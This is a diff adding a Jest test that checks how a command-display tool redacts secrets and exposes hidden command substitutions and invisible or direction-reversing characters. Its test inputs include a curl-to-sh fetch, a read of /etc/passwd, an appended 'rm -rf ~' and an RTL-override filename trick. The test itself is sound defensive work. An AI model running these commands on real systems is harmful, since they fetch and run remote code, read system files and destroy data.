@@ -246,6 +246,29 @@ test("a command keeps its secrets out and its Windows paths whole; sonde's own r
   expect(programOf("sonde demo-job export.py")).toBe("Demo");
 });
 
+test("a command is never shown with what it runs hidden: a value made by a command stays, and what would not show is written out", async () => {
+  const { commandLine, exactText, scrubCommand } = await import("../src/command");
+  // a secret's value is hidden; a value the shell runs a command to make is the command, kept whole
+  expect(scrubCommand('TOKEN="$(curl -s https://example.invalid/i | sh)" python job.py')).toBe('TOKEN="$(curl -s https://example.invalid/i | sh)" python job.py');
+  expect(scrubCommand("TOKEN=`id` python job.py")).toBe("TOKEN=`id` python job.py");
+  expect(scrubCommand("X=<(id) python job.py")).toBe("X=<(id) python job.py");
+  expect(scrubCommand("tool --token=$(cat /etc/passwd)")).toBe("tool --token=$(cat /etc/passwd)");
+  expect(scrubCommand("sh -c 'T=$(id) python x.py'")).toBe("sh -c 'T=$(id) python x.py'");
+  // (inside single quotes the shell runs nothing: a value as any other)
+  expect(scrubCommand("X='$(not run)' python job.py")).toBe("X=… python job.py");
+  expect(scrubCommand("X=\"a b\" Y='c d' python job.py")).toBe("X=… Y=… python job.py");
+  // what is about to run is shown exactly: nothing hidden, and every character that would not show as itself (a
+  // line break, a terminal escape, one that turns the text's direction, one of no width, a space that is no space,
+  // half a pair) as its code point
+  expect(exactText("AWS_SECRET_ACCESS_KEY=abc python x.py")).toBe("AWS_SECRET_ACCESS_KEY=abc python x.py");
+  expect(exactText("a\nb\tc\x1b[2Kd‮e​f g\r")).toBe("a⟨U+000A⟩b⟨U+0009⟩c⟨U+001B⟩[2Kd⟨U+202E⟩e⟨U+200B⟩f⟨U+00A0⟩g⟨U+000D⟩");
+  expect(exactText("数据 naïve 🙂 \ud83d x")).toBe("数据 naïve 🙂 ⟨U+D83D⟩ x");
+  expect(exactText("\u{e0041}")).toBe("⟨U+E0041⟩");
+  // and so is a list's line: a second command on a line of its own does not read as output under the first
+  expect(scrubCommand("python a.py\nrm -rf ~")).toBe("python a.py⟨U+000A⟩rm -rf ~");
+  expect(commandLine("python a.py ‮yp.b nohtyp")).toBe("$ python a.py ⟨U+202E⟩yp.b nohtyp");
+});
+
 test("since the run before, the findings each state counts read as words", async () => {
   const { findingsSaid } = await import("../src/ui/fixloop");
   const f = (state: "fixed" | "less" | "more" | "new", identity: string) => ({ identity, state, level: "warn" as const, text: `finding ${identity}`, phrases: [], predicted: {} as never });
